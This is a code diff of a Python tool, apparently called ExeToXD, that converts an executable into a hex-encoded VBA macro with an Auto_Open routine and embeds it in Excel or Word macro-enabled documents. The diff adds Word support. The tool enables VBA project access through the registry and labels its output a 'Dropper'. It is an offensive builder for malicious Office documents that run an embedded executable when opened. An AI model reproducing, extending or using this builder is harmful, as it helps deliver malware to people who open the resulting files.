@@ -14,19 +14,22 @@
 # Result will be saved to "./out" directory
 #
 
+import math
 import win32api
 import win32con
+import win32com.client
 import argparse
 import os
 import time
 import sys
-from openpyxl import Workbook, load_workbook
-import win32com.client
+import openpyxl
 import binascii
+import docx
 
 sys.coinit_flags = 0
 
-os.system('mkdir out')
+if not os.path.exists('out'):
+    os.system('mkdir out')
 OUT_DIR = os.path.abspath('./out')
 
 HEXDECODE = """Public Function HexDecode(sData As String) As String
@@ -45,8 +48,9 @@ Private Sub Auto_Open()
 
 """
 
-parser = argparse.ArgumentParser(description="-= ExeToXLSM v0.1 =-")
-parser.add_argument("--xlsm", dest="xlsm", default=None, help="Insert VB script to xlsm", required=True)
+parser = argparse.ArgumentParser(description="-= ExeToXD v0.2 =-")
+parser.add_argument("--xlsm", dest="xlsm", const='', help="Insert VB script to xlsm", required=False, action="store_const")
+parser.add_argument("--docm", dest="docm", const='', help="Insert VB script to docm", required=False, action="store_const")
 parser.add_argument("-i", dest="input", help="Input file", required=True)
 
 
@@ -89,12 +93,16 @@ def process_macro(filename):
     macro.close()
 
 
-def create_xlsm(file):
-    wb = Workbook()
-    ws = wb.active
-    wb.save(file)
-    wb = load_workbook(file, keep_vba=True)
-    wb.save(file)
+def create_document(file, type):
+    if type == "xlsm":
+        wb = openpyxl.Workbook()
+        ws = wb.active
+        wb.save(file)
+        wb = openpyxl.load_workbook(file, keep_vba=True)
+        wb.save(file)
+    elif type == "docm":
+        doc = docx.Document()
+        doc.save(file)
 
 
 def add_regkey():
@@ -104,15 +112,22 @@ def add_regkey():
     win32api.RegSetValueEx(key, "AccessVBOM", 0, win32con.REG_DWORD, 1)
 
 
-def include_xlsm(file):
-    print(f'{"Creating file...":32}', end='')
-    try:
-        create_xlsm(file)
-    except Exception:
-        print(f'[FAILED]')
-        exit(1)
-    print(f'[DONE]')
-    time.sleep(1)
+def include_office(file, type, creation_flag):
+    if creation_flag:
+        document = ''
+        print(f'{"Creating file...":32}', end='')
+        if type == "xlsm":
+            document = 'document.xlsm'
+        elif type == "docm":
+            document = 'document.docm'
+        try:
+            file = os.path.join(OUT_DIR, document)
+            create_document(file, type)
+        except Exception:
+            print(f'[FAILED]')
+            exit(1)
+        print(f'[DONE]')
+        time.sleep(1)
 
     print(f'{"Adding regkey...":32}', end='')
     try:
@@ -127,9 +142,14 @@ def include_xlsm(file):
     com_instance = None
     objworkbook = None
     xlmodule = None
-    print(f'{"Initializing EXCEL...":32}', end='')
+
+    print(f'{"Initializing Office App...":32}', end='')
     try:
-        com_instance = win32com.client.Dispatch("Excel.Application")  # USING WIN32COM
+        if type == "xlsm":
+            com_instance = win32com.client.Dispatch("Excel.Application")
+        elif type == "docm":
+            com_instance = win32com.client.Dispatch("Word.Application")
+
         com_instance.Visible = False
         time.sleep(10)
     except Exception:
@@ -140,14 +160,16 @@ def include_xlsm(file):
 
     print(f'{"Opening workbook...":32}', end='')
     try:
-        objworkbook = com_instance.Workbooks.Open(file)
-        time.sleep(10)
+        if type == "xlsm":
+            objworkbook = com_instance.Workbooks.Open(file)
+        elif type == "docm":
+            objworkbook = com_instance.Documents.Open(file)
+            time.sleep(1)
     except Exception:
         print(f'[FAILED]')
         com_instance.Quit()
         exit(1)
     print(f'[DONE]')
-
 
     print(f'{"Creating VBProject...":32}', end='')
     try:
@@ -161,7 +183,7 @@ def include_xlsm(file):
     print(f'{"Adding VBScript...":32}', end='')
     try:
         xlmodule.CodeModule.AddFromString(macro.strip())
-        time.sleep(30)
+        time.sleep(5)
     except Exception:
         print(f'[FAILED]')
         com_instance.Quit()
@@ -169,11 +191,10 @@ def include_xlsm(file):
     print(f'[DONE]')
 
     com_instance.DisplayAlerts = False
-
     print(f'{"Saving Dropper...":32}', end='')
     try:
         objworkbook.SaveAs(file, None, '', '')
-        time.sleep(10)
+        time.sleep(1)
     except Exception:
         print(f'[FAILED]')
         com_instance.Quit()
@@ -182,36 +203,87 @@ def include_xlsm(file):
 
     com_instance.Quit()
 
+def processing_xlsm(args, creation):
+    print(f'Start EXE to XLSM...\n')
+
+    print(f'Inserting VBA script to XLSM:')
+    try:
+        include_office(os.path.join(OUT_DIR, args.xlsm), "xlsm", creation)
+    except Exception:
+        print('\nError occurred while creating XLSM!')
+        exit(1)
+    print(f'\nXLSM successfully been created to out\\{args.xlsm}\n')
+
+
+def processing_docm(args, creation):
+    print(f'Start EXE to DOCM...\n')
+
+    print(f'Inserting VBA script to DOCM:')
+    try:
+        include_office(os.path.join(OUT_DIR, args.docm), "docm", creation)
+    except Exception:
+        print('\nError occurred while creating DOCM!')
+        exit(1)
+    print(f'\nDOCM successfully been created to out\\{args.docm}\n')
 
 def processing(args):
-    print(f'-= ExeToXLSM v0.1 =-\n')
+    print(f'-= ExeToXD v0.2 =-\n')
 
-    if args.xlsm and args.input:
+    if not args.xlsm and not args.docm:
+        print('No office tags specified. Just creating macros')
+
+
+    print(f'{"Creating VBA script...":32}', end='')
+    try:
+        process_macro(args.input)
+    except Exception:
+        print('Error occurred while creating VBA macros!')
+        exit(1)
+
+    print(f'[DONE]\n')
+
+    if args.xlsm is not None and args.docm is None:
+        creation = False
         if args.xlsm == '':
-            print('Enter xlsm filename (Example: document.xlsm')
-            exit(1)
-        if args.xlsm.split('.')[-1] != 'xlsm':
+            print('No xlsm specified, file will be created (document.xlsm)')
+            creation = True
+
+        if args.xlsm.split('.')[-1] != 'xlsm' and not creation:
             args.xlsm += '.xlsm'
 
-        print(f'Start EXE to XLSM...\n')
+        processing_xlsm(args, creation)
 
-        print(f'{"Creating VBA script...":32}', end='')
-        try:
-            process_macro(args.input)
-        except Exception:
-            print('Error occurred while creating VBA macros!')
-            exit(1)
+    elif args.xlsm is None and args.docm is not None:
+        creation = False
+        if args.docm == '':
+            print('No docm specified, file will be created (document.docm)')
+            creation = True
 
-        print(f'[DONE]\n')
-        print(f'Inserting VBA script to XLSM:')
-        try:
-            include_xlsm(os.path.join(OUT_DIR, args.xlsm))
-        except Exception:
-            print('\nError occurred while creating XLSM!')
-            os.remove(os.path.join(OUT_DIR, 'macros.txt'))
-            exit(1)
-        print(f'\nXLSM successfully been created to out\\{args.xlsm}\n')
-        os.remove(os.path.join(OUT_DIR, "macros.txt"))
+        if args.docm.split('.')[-1] != 'docm' and not creation:
+            args.docm += '.docm'
+
+        processing_docm(args, creation)
+    elif args.xlsm is not None and args.docm is not None:
+        creation_xlsm = False
+        creation_docm = False
+
+        if args.xlsm == '':
+            print('No xlsm specified, file will be created (document.xlsm)')
+            creation_xlsm = True
+
+        if args.xlsm.split('.')[-1] != 'xlsm' and not creation_xlsm:
+            args.xlsm += '.xlsm'
+
+        if args.docm == "docm":
+            print('No docm specified, file will be created (document.docm)')
+            creation_docm = True
+
+        if not creation_docm and args.docm.split('.')[-1] != 'docm' :
+            args.docm += '.docm'
+
+        processing_xlsm(args, creation_xlsm)
+        processing_docm(args, creation_docm)
+
 
     print(f'\n[FINISHED]\n')
 
